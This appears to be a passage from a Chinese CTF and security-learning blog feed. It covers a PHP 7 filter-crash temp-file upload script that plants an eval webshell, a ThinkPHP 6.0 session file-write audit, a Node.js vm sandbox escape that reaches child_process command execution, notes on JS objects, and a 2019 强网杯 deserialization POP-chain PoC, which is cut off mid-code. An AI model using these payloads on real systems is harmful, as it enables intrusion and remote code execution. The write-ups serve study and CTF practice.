class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/htmlPgo</span><br></pre></td></tr></table></figure>

<p>过滤了data和input不能用命令执行了，也不能直接写入文件</p>
<h3 id="PHP7-0bug"><a href="#PHP7-0bug" class="headerlink" title="PHP7.0bug"></a>PHP7.0bug</h3><p>php7.0的bug：</p>
<p>?file=php://filter/string.strip_tags/resource=/etc/passwd</p>
<blockquote>
<p>使用php://filter/string.strip_tags导致php崩溃清空堆栈重启，如果在同时上传了一个文件，那么这个tmp file就会一直留在tmp目录，再进行文件名爆破就可以getshell。这个崩溃原因是存在一处空指针引用。</p>
<p>该方法仅适用于以下php7版本，php5并不存在该崩溃。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">• php7.0.0-7.1.2可以利用， 7.1.2x版本的已被修复</span><br><span class="line"></span><br><span class="line">• php7.1.3-7.2.1可以利用， 7.2.1x版本的已被修复</span><br><span class="line"></span><br><span class="line">• php7.2.2-7.2.8可以利用， 7.2.9一直到7.3到现在的版本已被修复</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">##BytesIO实现了在内存中读写bytes</span><br><span class="line">from io import BytesIO</span><br><span class="line">import re</span><br><span class="line">payload &#x3D; &quot;&lt;?php eval($_POST[a]);?&gt;&quot;</span><br><span class="line">#BytesIO(payload.encode()).getvalue()</span><br><span class="line">data&#x3D;&#123;</span><br><span class="line">   &#39;file&#39;: BytesIO(payload.encode())</span><br><span class="line">&#125;</span><br><span class="line">url&#x3D;&quot;http:&#x2F;&#x2F;a06f9704-b58f-4b3a-b85c-5ad42d0b8833.node4.buuoj.cn&#x2F;flflflflag.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;string.strip_tags&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd&quot;</span><br><span class="line">try:</span><br><span class="line">   r&#x3D;requests.post(url&#x3D;url,files&#x3D;data,allow_redirects&#x3D;False)</span><br><span class="line">except:</span><br><span class="line">        print(&quot;fail!&quot;)</span><br></pre></td></tr></table></figure>

<p>python运行脚本即可，然后读dir.php中看一下文件名，接下来使用文件包含即可<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210713172603.png" alt="img"></p>
]]></content>
  </entry>
  <entry>
    <title>thinkphpv6.0代码审计</title>
    <url>/2021/07/15/thinkphpv6-0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>正好做到一题thinkphp框架漏洞，于是决定自己审计一番~，正好学学如何入门</p>
<h2 id="代码审计两种方式"><a href="#代码审计两种方式" class="headerlink" title="代码审计两种方式"></a>代码审计两种方式</h2><p>1**.通读全文源码**<br>2.<strong>功能点审计</strong>：根据漏洞对应发生函数进行功能行审计，常会用到逆向溯源数据流方法进行审计<br>3.<strong>正向追踪数据流</strong>：根据用户输入参数-&gt;来到代码逻辑-&gt;最后审计代码逻辑缺陷-&gt;尝试构造payload<br>4.<strong>逆向溯源数据流</strong>:字符串搜索指定操作函数_跟踪函数可控参数-&gt;审计代码逻辑缺陷-&gt;尝试构造payload<br><strong>CMS可分为两大类</strong><br>单入口cms:不管访问哪个模块都使用同一个入口文件，常见的MVC框架采用这种模式<br>多入口cms:每个模块都有一个入口文件(可以前端设置一个入口文件 index.php，后端创建一个入口文件admin.php，前后端的入口文件是独立的)。</p>
<h2 id="代码审计思路"><a href="#代码审计思路" class="headerlink" title="代码审计思路"></a>代码审计思路</h2><p>接下来我们从三个层次开始我们的源码审计思路</p>
<p>1.确定要审计的源码是什么语言</p>
<p>2.确定该源码是单入口还是多入口</p>
<p>3.确定该语言的各种漏洞诞生的函数</p>
<h2 id="PHP核心配置"><a href="#PHP核心配置" class="headerlink" title="PHP核心配置"></a>PHP核心配置</h2><p>一个漏洞在不同环境造成的结果也是不一样的。</p>
<p>由于关于php.ini配置的内容过于多，这里推荐浏览官方文档 <a href="https://www.php.net/manual/zh/ini.php%EF%BC%8C%E6%88%91%E4%BB%AC%E5%9C%A8%E8%BF%99%E9%87%8C%E4%B8%BB%E8%A6%81%E5%88%97%E4%B8%8Bphp.ini">https://www.php.net/manual/zh/ini.php，我们在这里主要列下php.ini</a> 主要使用的安全配置。</p>
<ul>
<li><code>safe_mode = off</code></li>
</ul>
<blockquote>
<p>用来限制文档的存取,限制环境变量的存取,控制外部程序的执行.<strong>PHP5.4.0移除。</strong></p>
</blockquote>
<ul>
<li>限制环境变量存取<code>safe_mode_allowed_env_vars = string</code></li>
</ul>
<blockquote>
<p>指定php程序可以改变的环境变量的前缀,当这个选项的值为空时,那么php可以改变任何环境变量,如果 如:safe_mode_allowed_env_vars = PHP_,当这个选项的值为空时,那么php可以改变任何环境变量。</p>
</blockquote>
<ul>
<li>外部程序执行目录<code>safe_mode_exec_dir = &quot;/usr/local/bin&quot;</code></li>
</ul>
<blockquote>
<p>当安全模式被激活，safe_mode_exec_dir参数限制通过exec()函数执行的可执行文件到指定的目录。举例来说，如果你想限制在/usr/local/bin目录执行功能，你可以使用这个指令：</p>
<p>safe_mode_exec_dir = “/usr/local/bin”</p>
</blockquote>
<ul>
<li><p>禁用函数</p>
<p><code>disable_functions</code></p>
</li>
</ul>
<blockquote>
<p>为了更安全的运行PHP,可以用此指令来禁止一些敏感函数的使用,当你想用本指令禁止一些危险函数时,切记把dl()函数也加到禁止列表,攻击者可以利用dl()函数加载自定义的php扩展突破disable_functions.配置禁止函数时可以使用逗号分隔函数名。</p>
</blockquote>
<ul>
<li>COM组件<code>com.allow_dcom = false</code></li>
</ul>
<blockquote>
<p>PHP设置在安全模式下(safe_mode),仍允许攻击者使用COM()函数来创建系统组件来还行任意命令,推荐关闭这个函数。 使用COM()函数需要在PHP.ini中配置<code>extension=php_com_dotnet.dll</code>,如果PHPversion&lt;5.4.5则不需要。</p>
</blockquote>
<ul>
<li>全局变量注册开关<code>register_globals = off</code></li>
</ul>
<blockquote>
<p>php.ini的register_globals选项的默认值为OFF,在4.2版本之前是默认开启的,当设定为On时,程序可以接收来自服务器的各种环境变量,包括表单提交的变量,这是对服务器分厂不安全的, register_globals = off时,服务器端获取数据的时候用$_GET[‘name’]来获取数据。 register_globals = on时,服务端使用POST或GET提交的变量,豆浆自动使用全局变量的值来接受。</p>
</blockquote>
<ul>
<li>魔术引号自动过滤<code>magic_quotes_gpc = on</code></li>
</ul>
<blockquote>
<p>PHP5.4.0被移除 magic_quotes_gpc = off 在php.ini中默认是关闭的,如果打开它,将自动把用户提交对sql的查询的语句进行转换,如果设置成ON,php会把所有的单引号,双引号,和反斜杠和空字符(NULL)加上反斜杠()进行转义 它会影响HTTP请求的数据(GET,POST.COOKIE),开启它会提高网站的安全性。</p>
</blockquote>
<ul>
<li>是否允许包含远程文件<code>allow_url_include = off</code></li>
</ul>
<blockquote>
<p>该配置为ON的情况下,可以直接包含远程文件,若包含的变量为可控的情况下,可以直接控制变量来执行PHP代码。</p>
</blockquote>
<ul>
<li>是否允许打开远程文件<code>allow_url_open = on</code></li>
</ul>
<blockquote>
<p>允许本地PHP文件通过调用url重写来打开或者关闭写权限,默认的封装协议提供的ftp和http协议来访问文件。</p>
</blockquote>
<ul>
<li>HTTP头部版本信息<code>expose_php = off</code></li>
</ul>
<blockquote>
<p>防止通过http头泄漏php版本信息。</p>
</blockquote>
<ul>
<li>文件上传临时目录<code>upload_tmp_dir =</code></li>
</ul>
<blockquote>
<p>上传文件临时保存的目录,如果不设置的话,则采用系统的临时目录。</p>
</blockquote>
<ul>
<li>用户可访问目录<code>open_basedir = D:\WWW</code></li>
</ul>
<blockquote>
<p>能够控制PHP脚本只能访问指定的目录,这样能够避免PHP脚本访问不应该访问的文件,一定程度上限制了。webshell的危害</p>
</blockquote>
<ul>
<li>内部错误选项<code>display_errors = on</code></li>
</ul>
<blockquote>
<p>表明实现PHP脚本的内部错误,网站发布后建议关不PHP的错误回显。</p>
</blockquote>
<ul>
<li>错误报告级别<code>error_reporting(E_ALL &amp; ~Enotice)</code></li>
</ul>
<blockquote>
<p>具体列表推荐：<a href="https://www.runoob.com/php/func-error-reporting.html">https://www.runoob.com/php/func-error-reporting.html</a></p>
<p>这里设置的作用是将错误级别调到最高,显示所有问题,方便环境部署时候排错。</p>
</blockquote>
<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>人生建议，一定要安装phpstudy的集成环境–<br>更改配置的根目录为www(5)的web目录<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210714205154.png" alt="img"><br>修改为www/web/目录打开即可，接下来去配置一下数据库<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210714205245.png" alt="img" style="zoom:67%;"></p>
<p>去config中的database.php修改一下配置信息，然后去mysql中创建一下表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create database ctf;</span><br></pre></td></tr></table></figure>

<p>但是他的很多表和库的信息我们都不清楚–。。。。所以还是老老实实重新安装整个框架了。。<br><a href="https://www.kancloud.cn/manual/thinkphp6_0/1037481">https://www.kancloud.cn/manual/thinkphp6_0/1037481</a><br>这里降级的时候一直没弄好，不懂是为啥，用了其他的安装和降级指令才行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">composer create-project topthink&#x2F;think tp60</span><br></pre></td></tr></table></figure>

<p>修改composer.json里面的”topthink/frameword”为6.0.0</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210715140505.png" alt="img" style="zoom:67%;">
去掉前面你的注释符，开启session
然后更改apache的根目录为框架里面的public目录

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210715134244.png" alt="img" style="zoom:67%;">
创建成功：
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210715140701.png" alt="img" style="zoom: 33%;">
果然最难的就是环境的配置--
接下来修改一下:tp60\app\controller\的index.php文件使他可以创建session
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210715140937.png" alt="img" style="zoom:67%;">

<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>根据漏洞描述，是因为session可控，传入的session值最后会拼接在sess_后形成任意文件读取覆盖，所以这里我们就直接跟进session值的传入。<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210715155925.png" alt="img" style="zoom:67%;"><br>进入session.php观察如何进行文件写入</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210715161558.png" alt="img"><br>跟进以后发现无过滤，只要长度符合32位就对sessionID进行赋值<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210715161834.png" alt="img"></p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210715164037.png" alt="img"><br>接下来进行save()函数进行session的保存，可以看到write函数，将data写入sessionID中<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210715162555.png" alt="img"></p>
<p>将sessionid和sess_进行拼接形成新的文件名存放在/runtime/session/路径中<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210715164437.png" alt="img" style="zoom:67%;"></p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210715164440.png" alt="img" style="zoom:67%;">

<p>将传入的data值，写入改session文件中<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210715164822.png" alt="img" style="zoom:67%;"><br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210715164821.png" alt="img" style="zoom:67%;"></p>
<p>但是由于我网站根目录设置的是public，懒得再弄了，被配置环境弄怕了–<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210715170513.png" alt="img" style="zoom:67%;"></p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210715170514.png" alt="img" style="zoom:50%;">

<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>啊 无语了，想说换成phpstudy继承的，但是发现没有适合的php版本于是就又换了回去，期间debug的更换配置也是让人很头疼，最后瞎配置 也总算是配置好了–，真的是有点傻了<br>说一下第一次审计的收获<br>1.使用ctrl加鼠标左键可以直接看该函数的出现的位置<br>2.可以右键单击某个值添加观察追踪其改变位置<br>3.根据出问题的功能追踪其功能</p>
]]></content>
  </entry>
  <entry>
    <title>node.js沙盒逃逸分析</title>
    <url>/2021/07/13/node-js%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>在日常开发中，会在业务代码中直接使用eval/function/vm等功能，其中 eval/Function 算是动态执行 JS，但无法屏蔽当前执行环境的上下文，但node.js 里提供了 vm 模块，相当于一个虚拟机，可以让你在执行代码时候隔离当前的执行环境，避免被恶意代码攻击。</p>
<h2 id="沙盒简介"><a href="#沙盒简介" class="headerlink" title="沙盒简介"></a>沙盒简介</h2><p>沙盒的特点在于很好的系统隔离性，在某种程度上，沙盒sandbox可以视为一个容器container，application运行在沙盒中，沙盒运行在windows操作系统上运行在沙盒中的application和沙盒外的application一样可以访问硬盘中的文件等资源。运行在沙盒中的application和沙盒外的application的主要区别在于：</p>
<ol>
<li><p>对于沙盒外的application而言，沙盒内的application是透明的（即不可见的）；</p>
</li>
<li><p>当沙盒内的application退出后，所做的<strong>更改将不会被保存</strong>。</p>
</li>
</ol>
<p>一个很好的例子是：当沙盒内的application退出后，沙盒内的application已下载或“安装”的恶意软件都将被丢弃。</p>
<p>总而言之，<strong>沙盒就是一个可以让你相对安全执行代码的环境</strong></p>
<h2 id="沙盒逃逸"><a href="#沙盒逃逸" class="headerlink" title="沙盒逃逸"></a>沙盒逃逸</h2><p>首先来一段沙盒逃逸的实例，直接进行分析：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> ctx = &#123;&#125;;</span><br><span class="line">vm.runInNewContext(<span class="string">&#x27;this.constructor.constructor(&quot;return process&quot;)().exit()&#x27;</span>, ctx);<span class="comment">//vm.runInNewContext是编译和运行里面的javascript代码，其中的ctx似乎是可控的，而this指向了ctx</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;Never gets executed.&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>以上事例大致可以拆分出:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">tmp=ctx.constructor<span class="comment">//object</span></span><br><span class="line">exec=tmp.constructor<span class="comment">//Function</span></span><br><span class="line">exec(<span class="string">&#x27;return Process&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>以上被称为原型链的方式完成逃逸，个人感觉可以和继承的思想联系在一起，有点类似但是又不同，<strong>大概是通过往前引用原型链，引用到沙箱外的函数，从而实现逃逸</strong>。</p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210713120601.png" alt="img" style="zoom:50%;">
根据这个图片进行讲解，就是在vm上下文通过原型链的prototype属性向上链接引用function，引用到全局数据实现在沙盒内进行沙盒外的function的调用。

<h2 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> context = &#123;</span><br><span class="line">    animal: <span class="string">&#x27;cat&#x27;</span>,</span><br><span class="line">    count: <span class="number">2</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> script = <span class="keyword">new</span> vm.Script(<span class="string">`this`</span>);</span><br><span class="line">vm.createContext(context);</span><br><span class="line"><span class="keyword">var</span> result = script.runInContext(context);</span><br><span class="line"><span class="built_in">console</span>.log(result.Function == <span class="built_in">Function</span>); <span class="comment">//false</span></span><br></pre></td></tr></table></figure>

<p>其中<code>this</code>通过其__proto__属性指向的是主环境的Object.prototype，所以:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">this.constructor.constructor(&#39;return process&#39;)().mainModule.require(&#39;child_process&#39;).execSync(&#39;whoami&#39;).toString()</span><br></pre></td></tr></table></figure>

<p>1.通过this的原型链向上获得主环境的function<br>2.然后通过(‘return process’)()获得主环境process变量<br>3通过process.mainModule.require导入child_process模块，实现命令执行</p>
<h3 id="知识补充"><a href="#知识补充" class="headerlink" title="知识补充"></a>知识补充</h3><p><strong>process变量：</strong>是nodejs中的一个全局变量，<br>拿到这个环境变量，相当于此时是在主环境下进行函数的执行，类似偷梁换柱？</p>
<p><strong>child_process模块：</strong>提供了命令执行的方法</p>
<p><a href="http://nodejs.cn/api/child_process.html#child_process_child_process">http://nodejs.cn/api/child_process.html#child_process_child_process</a><br><a href="https://chinese.freecodecamp.org/forum/t/topic/587">https://chinese.freecodecamp.org/forum/t/topic/587</a><br><a href="https://liotree.github.io/2020/04/29/vm2%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%88%86%E6%9E%90/">https://liotree.github.io/2020/04/29/vm2%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%88%86%E6%9E%90/</a></p>
]]></content>
  </entry>
  <entry>
    <title>论js的对象</title>
    <url>/2021/07/13/%E8%AE%BAjs%E7%9A%84%E5%AF%B9%E8%B1%A1/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>发现学习node.js的沙盒逃逸时，对象的概念也需要理解一下。</p>
<h2 id="什么是js"><a href="#什么是js" class="headerlink" title="什么是js"></a>什么是js</h2><p>js就是javascript，js里面一切皆对象，理解对象是理解js语言的关键</p>
<h2 id="封装、继承、多态"><a href="#封装、继承、多态" class="headerlink" title="封装、继承、多态"></a>封装、继承、多态</h2><p>在C++/Java等传统面向对象编程中，类（class）是对象（object）的模板，class不占用内存空间，object占用内存，object也称为class instance，同一个class可以被new出很多个object。</p>
<p>Javascript语言不支持”类”，但Javascript仍然是面向对象语言，面向对象的3要素在JavaScript里都支持:</p>
<ul>
<li>封装 - 数据与方法封装在一起，方法可以操作数据，这就是JS里的object</li>
<li>继承 - 新创建的对象可以继承父对象的数据和方法，js里有多种方法实现继承，譬如原型方式继承，拷贝继承等</li>
<li>多态 - 一个接口有多种实现</li>
</ul>
<p>实际上，js里一切皆对象。</p>
<h2 id="什么是对象"><a href="#什么是对象" class="headerlink" title="什么是对象"></a>什么是对象</h2><p>js里的对象（object）就是一组键值(name-value)的集合, name总是string类型, value可以是各种类型, 可以是基本数据类型, 可以是数组或其他对象, 也可以是函数, object很像是一个hash map. object里的name-value是无序的。</p>
<p>对象是动态的，可以动态地增加属性和方法。</p>
<h2 id="对象属性"><a href="#对象属性" class="headerlink" title="对象属性"></a>对象属性</h2><h3 id="属性特性"><a href="#属性特性" class="headerlink" title="属性特性"></a>属性特性</h3><p>每个属性都拥有4个特性，数据属性和访问器属性一共有6种属性特性:</p>
<ul>
<li>数据属性特有的特性:<ul>
<li><code>[[Value]]</code>: 属性的值.</li>
<li><code>[[Writable]]</code>: 控制属性的值是否可以改变.</li>
</ul>
</li>
<li>访问器属性特有的特性:<ul>
<li><code>[[Get]]</code>: 存储着getter方法.</li>
<li><code>[[Set]]</code>: 存储着setter方法.</li>
</ul>
</li>
<li>两种属性都有的特性:<ul>
<li><code>[[Enumerable]]</code>: 如果一个属性是不可枚举的,则在一些操作下,这个属性是不可见的,比如for…in和Object.keys()</li>
<li><code>[[Configurable]]</code>: 如果一个属性是不可配置的,则该属性的所有特性(除了%%[[Value]]%%)都不可改变</li>
</ul>
</li>
</ul>
<h3 id="对象的原型-prototype"><a href="#对象的原型-prototype" class="headerlink" title="对象的原型[[prototype]]"></a>对象的原型[[prototype]]</h3><p>在js中所有对象都有一个隐含的属性<code>[[prototype]]</code>指向其原型对象，原型对象也有自己的原型，如此下去便形成一个原型链，所有对象的原型链的顶层都是Object.prototype.</p>
<p>请注意，<code>[[prototype]]</code>并不是一个真实的属性名，因此无法通过这个属性名获得原型对象，但js提供了方法来读取和判断对象的原型:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 接前面的例子</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>.getPrototypeOf(myFather) === Person.prototype); <span class="comment">//true</span></span><br><span class="line"><span class="built_in">console</span>.log(Person.prototype.isPrototypeOf(myFather)); <span class="comment">//true</span></span><br><span class="line"><span class="built_in">console</span>.log(Person.prototype.isPrototypeOf(myMother)); <span class="comment">//false</span></span><br></pre></td></tr></table></figure>

<p>对象的原型链通常是只读的，用户无法修改某个对象的原型，所以无法修改对象的继承关系。</p>
<h4 id="属性proto"><a href="#属性proto" class="headerlink" title="属性proto"></a>属性<strong>proto</strong></h4><p>在js规范里，对象原型通常是不可见的属性，因此无法直接访问。但某些浏览器里支持<code>__proto__</code>属性，firefox/chrome/safari/nodejs都支持<code>__proto__</code>属性，在这些浏览器里对象原型是可见的，可以直接访问对象的<code>__proto__</code>属性得到对象原型，也可以通过修改对象的<code>__proto__</code>属性来修改对象的原型链。</p>
<p>ECMAScript 6正在讨论把<code>__proto__</code>属性标准化，但目前属性<code>__proto__</code>还不是标准。</p>
<p>本文接下来提到的<code>__proto__</code>, <code>[[prototype]]</code>都是指一个意思，即自身对象里指向其原型对象的属性。</p>
<h4 id="prototype"><a href="#prototype" class="headerlink" title="prototype"></a>prototype</h4><p>函数也是对象，所以函数也有属性<code>__proto__</code>，通过字面量声明的函数其原型对象是Function.prototype，当然Function.prototype的原型对象是Object.prototype.</p>
<p>函数还有一个特有的属性<code>prototype</code>，每个函数都有一个prototype属性（特别注意，prototype属性是函数对象特有的属性，不要和js中每个对象到其原型的连接相混淆，那个是隐藏的，只是在firefox/chrome等浏览器中你可以使用<code>__proto__</code>访问到）</p>
<h5 id="constructor-NaN"><a href="#constructor-NaN" class="headerlink" title="constructor"></a>constructor</h5><h6 id="Object-prototype-constructor"><a href="#Object-prototype-constructor" class="headerlink" title="Object.prototype.constructor"></a>Object.prototype.constructor</h6><p>返回创建实例对象的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object"><code>Object</code></a> 构造函数的引用。注意，此属性的值是对函数本身的引用，而不是一个包含函数名称的字符串。对原始类型来说，如<code>1</code>，<code>true</code>和<code>&quot;test&quot;</code>，该值只可读。</p>
<h6 id="详情"><a href="#详情" class="headerlink" title="详情"></a>详情</h6><p>所有对象都会从它的原型上继承一个constructor属性:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> o = &#123;&#125;;</span><br><span class="line">o.constructor === <span class="built_in">Object</span>; <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<h6 id="示例"><a href="#示例" class="headerlink" title="示例:"></a>示例:</h6><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Tree</span>(<span class="params">name</span>)</span>&#123;</span><br><span class="line"><span class="built_in">this</span>.name=name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> theTree=<span class="keyword">new</span> Tree(<span class="string">&quot;Redwood&quot;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;theTree.constructor is &quot;</span>+the Tree.constructor);</span><br><span class="line"><span class="comment">//打印输出</span></span><br><span class="line">theTree.constructor is <span class="function"><span class="keyword">function</span> <span class="title">Tree</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.name = name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>大概整理一下js的对象的一些基础概念，<br>1.每个对象都有[[prototype]]属性，是用来指向自己的原型对象<br>2.所有对象的[[prototype]]是_proto_，而函数有一个特有的属性是prototype<br>3.prototype有个属性是constructor指向其原型对象的，可以进行调用。</p>
]]></content>
  </entry>
  <entry>
    <title>2019强网杯upload</title>
    <url>/2021/07/13/2019%E5%BC%BA%E7%BD%91%E6%9D%AFupload/</url>
    <content><![CDATA[<h2 id="强网杯-2019-Upload"><a href="#强网杯-2019-Upload" class="headerlink" title="[强网杯 2019]Upload"></a>[强网杯 2019]Upload</h2><p><a href="http://www.tar.gz有他的源码，注册以后发现可以文件上传，审计一下他的文件上传功能：">www.tar.gz有他的源码，注册以后发现可以文件上传，审计一下他的文件上传功能：</a><br>将上传的文件的后缀更改为png</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210716082418.png" alt="img" style="zoom:67%;">

<p>然后使用getimagesize检查文件头是否为图片</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210716082534.png" alt="img" style="zoom:67%;">

<p>文件上传这里似乎没有太多机会，可能需要哪里辅助一下<br>这里有个反序列化函数，可以对profile进行赋值</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210716084205.png" alt="img" style="zoom:67%;">
底下有两个魔术方法:
get：读取不可访问或不存在的属性时调用
call：调用不可访问或不存在的方法时调用
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210716085443.png" alt="img" style="zoom:67%;">

<p>看了一下其他地方发现有个destruct方法<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210716102445.png" alt="img" style="zoom:67%;"></p>
<h3 id="思路整理"><a href="#思路整理" class="headerlink" title="思路整理"></a>思路整理</h3><p>1.文件上传的限制在于后缀名会被强制更改为png<br>2.可以对cookie的值进行反序列化，会触发get、call魔术方法调用不存在的属性和方法对profile进行重新赋值操作<br>3.如何将profile和更换文件后缀联系在一起呢？<br>——————————————————————<br>我们可以看到在upload_img()函数中有一个copy函数，将filename_tmp的值赋给了filename。那么思路就是这样：<br>1.先上传一个图片马<br>2.然后通过cookie传入反序列化内容，其中反序列化的思路应该是这样的:<br>为了使用call和get方法，所以我们要调用没有的属性和方法，profile.php中没有register中的方法，所以这里就可以先写一波:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$registed&#x3D;new Register();</span><br><span class="line">$registed-&gt;registed&#x3D;false;</span><br><span class="line">$registed-&gt;checker&#x3D;$profiled;</span><br></pre></td></tr></table></figure>

<p>接下来就会调用profile里面的get和call方法:<br>首先会调用call方法因为index方法不存在再profile类里面，因为我们的目的是利用call方法调用upload_img()，所以我们需要利用get方法对name赋值，由于get是调用不存在的属性，所以我们这里依旧是利用index来作为一个跳板置换成upload_img(),然后有几个判断是我们需要绕过的，其中包括检查ext是否为png</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$profiled&#x3D;new Profile();</span><br><span class="line">$profiled-&gt;except&#x3D;[&#39;index&#39;&#x3D;&gt;&#39;upload_img&#39;];</span><br><span class="line">$profiled-&gt;ext&#x3D;&quot;png&quot;;</span><br><span class="line">$profiled-&gt;filename&#x3D;&quot;&#x2F;upload&#x2F;7792cab172a46cd0ff2d8d7fae734ba2&#x2F;8111.php&quot;;</span><br><span class="line">$profiled-&gt;filename_tmp&#x3D;&quot;&#x2F;upload&#x2F;7792cab172a46cd0ff2d8d7fae734ba2&#x2F;8383c2ba7b9a26c39fbe4c61bf398ed4.php&quot;;</span><br></pre></td></tr></table></figure>

<p>完整的poc如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $filename_tmp;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $upload_menu;</span><br><span class="line">    <span class="keyword">public</span> $ext;</span><br><span class="line">    <span class="keyword">public</span> $img;</span><br><span class="line">    <span class="keyword">public</span> $except;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$name</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;except[$name];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$name, $arguments</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;&#123;$name&#125;) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Register</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $checker;</span><br><span class="line">        <span class="keyword">public</span> $registed;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;registed)&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;checker-&gt;index();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">$profiled=<span 